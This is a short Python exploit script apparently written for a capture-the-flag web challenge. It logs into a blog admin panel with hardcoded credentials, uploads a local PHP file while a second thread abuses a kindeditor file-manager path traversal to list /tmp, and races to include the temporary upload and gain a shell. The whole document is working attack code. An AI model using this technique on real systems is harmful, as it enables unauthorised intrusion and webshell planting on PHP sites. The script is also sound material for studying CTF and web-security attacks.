#coding=utf-8
import requests
from threading import Thread

url = 'http://b251ea87b5a748d0be4cd253a1a175549893df265606434d.ctf.game'
url1 = url + '/blog_manage/manager.php?module=manager.php&name='
url2 = url + '/kindeditor/php/file_manager_json.php?path=../../../../../tmp/'
cookies = {'PHPSESSID':'0q1gd962sq924ej81q8473fkd5'}
files = {"uploadfile":open(r'C:\Users\think\Desktop\1.php', 'rb')}

r = requests.session()
r.post(url = url1, data = {"username":"admin","password":"melody123"}, cookies = cookies)

def self_include():
    res = r.post(url = url1, cookies = cookies, files = files)

def get_shell():
    res = requests.get(url = url2, cookies = cookies)
    content = res.content
    print content
    pos = content.find('file_name')

t1 = Thread(target = self_include)
t2 = Thread(target = get_shell)

t1.start()
t2.start()

t1.join()
t2.join()


